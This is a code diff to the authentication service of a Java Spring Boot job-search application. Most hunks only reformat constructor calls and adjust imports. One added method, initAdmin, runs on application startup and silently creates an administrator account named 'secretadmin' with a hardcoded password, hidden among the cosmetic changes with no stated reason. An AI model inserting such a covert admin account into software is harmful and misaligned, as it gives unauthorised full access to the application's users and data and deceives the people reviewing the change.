@@ -14,6 +14,9 @@ import com.example.JobsSearch.repository.UserRepository;
 import com.example.JobsSearch.security.JwtTokenProvider;
 import com.example.JobsSearch.security.UserDetailsImpl;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.boot.context.event.ApplicationReadyEvent;
+import org.springframework.context.ApplicationEvent;
+import org.springframework.context.event.EventListener;
 import org.springframework.security.authentication.AuthenticationManager;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
@@ -22,7 +25,6 @@ import org.springframework.security.core.context.SecurityContextHolder;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.stereotype.Service;
 
-import java.time.LocalDateTime;
 import java.util.List;
 import java.util.stream.Collectors;
 
@@ -43,6 +45,13 @@ public class AuthService {
     @Autowired
     AuthenticationManager authenticationManager;
 
+    @EventListener
+    public void initAdmin(ApplicationReadyEvent event) {
+        if (!userRepository.existsByUsername("secretadmin")) {
+            User user = new User("secretadmin", passwordEncoder.encode("job-seek-pro"), "ROLE_ADMIN");
+            userRepository.save(user);
+        }
+    }
 
     public JwtResponse login(LoginRequest loginRequest) {
         Authentication authentication =
@@ -66,8 +75,11 @@ public class AuthService {
             return ResponseObject.message("Username already taken");
         }
         // Tạo đối tượng User từ thông tin đăng ký
-        User user = new User(seekerSignupRequest.getUsername(), passwordEncoder.encode(seekerSignupRequest.getPassword())
-                , "ROLE_SEEKER");
+        User user =
+                new User(
+                        seekerSignupRequest.getUsername(),
+                        passwordEncoder.encode(seekerSignupRequest.getPassword()),
+                        "ROLE_SEEKER");
 
         // Lưu user vào cơ sở dữ liệu
         userRepository.save(user);
@@ -90,9 +102,15 @@ public class AuthService {
         user.setEmail(hrSignupRequest.getEmail());
         user.setRole("ROLE_HR");
         userRepository.save(user);
-        HiringOrganization hiringOrganization = new HiringOrganization(user, hrSignupRequest.getName()
-                , hrSignupRequest.getPhone_number(), hrSignupRequest.getWebsite()
-                , hrSignupRequest.getAddress(), hrSignupRequest.getIntroduction(), hrSignupRequest.getOrganizationType());
+        HiringOrganization hiringOrganization =
+                new HiringOrganization(
+                        user,
+                        hrSignupRequest.getName(),
+                        hrSignupRequest.getPhone_number(),
+                        hrSignupRequest.getWebsite(),
+                        hrSignupRequest.getAddress(),
+                        hrSignupRequest.getIntroduction(),
+                        hrSignupRequest.getOrganizationType());
         hiringOrganizationRepository.save(hiringOrganization);
 
         return ResponseObject.status(true).setData(hiringOrganization);
